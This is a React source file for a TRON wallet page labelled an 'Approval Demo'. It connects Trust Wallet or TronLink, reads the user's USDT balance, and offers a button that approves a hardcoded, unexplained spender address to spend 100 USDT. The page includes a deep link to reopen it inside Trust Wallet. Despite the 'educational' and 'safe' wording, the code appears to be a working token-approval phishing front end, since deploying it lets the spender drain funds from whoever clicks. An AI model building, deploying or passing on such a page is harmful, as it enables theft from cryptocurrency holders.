import React, { useEffect, useState } from "react";

/* =========================
   TRC20 CONFIG
========================= */

const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20
const SPENDER_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
const APPROVAL_AMOUNT = "100000000"; // 100 USDT (safe)

function App() {
  const [isTron, setIsTron] = useState(false);
  const [wallet, setWallet] = useState(null);
  const [contract, setContract] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);

  const addLog = (m) => setLogs((p) => [...p, m]);

  /* =========================
     DETECT ENVIRONMENT
  ========================= */
  useEffect(() => {
    if (window.tronWeb && window.tronWeb.ready) {
      setIsTron(true);
      addLog("✅ TRON wallet detected (Trust Wallet / TronLink)");
    } else {
      setIsTron(false);
      addLog("🌐 Browser mode (read-only)");
    }
  }, []);

  /* =========================
     CONNECT WALLET (TRON)
  ========================= */
  const connectWallet = async () => {
    try {
      if (!window.tronWeb || !window.tronWeb.ready) return;

      const address = window.tronWeb.defaultAddress.base58;
      if (!address) {
        addLog("❌ Unlock wallet first");
        return;
      }

      const trx = await window.tronWeb.trx.getBalance(address);
      const token = await window.tronWeb.contract().at(TOKEN_ADDRESS);

      setWallet({
        address,
        short: address.slice(0, 8) + "..." + address.slice(-6),
        trx: (trx / 1e6).toFixed(3),
      });
      setContract(token);

      addLog("✅ Wallet connected");
    } catch {
      addLog("❌ Connection failed");
    }
  };

  /* =========================
     APPROVE (ONLY IN WALLET)
  ========================= */
  const approve = async () => {
    try {
      setLoading(true);

      const hexUser = window.tronWeb.address.toHex(wallet.address);
      const bal = await contract.balanceOf(hexUser).call();
      addLog(`💰 Balance: ${(bal / 1e6).toFixed(2)} USDT`);

      const ok = window.confirm(
        "Educational demo\nApprove LIMITED amount (100 USDT)?"
      );
      if (!ok) return;

      await contract
        .approve(
          window.tronWeb.address.toHex(SPENDER_ADDRESS),
          APPROVAL_AMOUNT
        )
        .send({ feeLimit: 100_000_000 });

      addLog("✅ Approval successful");
    } catch {
      addLog("❌ Transaction failed");
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     UI
  ========================= */
  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
      <div className="max-w-xl w-full bg-zinc-900 p-6 rounded-xl">

        <h1 className="text-xl font-bold text-center mb-4">
          🔐 TRC20 Approval Demo
        </h1>

        {/* Logs */}
        <div className="bg-black p-3 rounded text-sm mb-4">
          {logs.map((l, i) => <div key={i}>{l}</div>)}
        </div>

        {/* Browser Mode */}
        {!isTron && (
          <div className="space-y-3">
            <div className="bg-yellow-900/30 p-3 rounded text-sm">
              ⚠️ Transactions require Trust Wallet or TronLink.
            </div>
            <a
              href={`https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(window.location.href)}`}
              className="block text-center bg-blue-600 py-3 rounded font-bold"
            >
              Open in Trust Wallet
            </a>
          </div>
        )}

        {/* Wallet Mode */}
        {isTron && !wallet && (
          <button
            onClick={connectWallet}
            className="w-full py-3 bg-blue-600 rounded font-bold"
          >
            Connect Wallet
          </button>
        )}

        {wallet && (
          <>
            <div className="bg-black p-3 rounded text-sm mb-3">
              <p>Address: {wallet.short}</p>
              <p>TRX: {wallet.trx}</p>
            </div>

            <button
              onClick={approve}
              disabled={loading}
              className="w-full py-3 bg-red-600 rounded font-bold"
            >
              {loading ? "Processing..." : "Approve (Demo)"}
            </button>
          </>
        )}

      </div>
    </div>
  );
}

export default App;
